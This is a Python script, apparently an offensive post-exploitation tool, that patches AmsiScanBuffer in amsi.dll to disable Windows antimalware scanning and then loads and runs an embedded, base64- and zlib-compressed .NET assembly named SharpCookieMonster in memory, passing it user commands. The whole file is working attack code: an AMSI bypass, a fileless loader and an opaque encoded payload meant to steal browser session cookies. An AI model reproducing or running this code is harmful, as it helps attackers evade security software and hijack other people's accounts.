import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCookieMonster.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()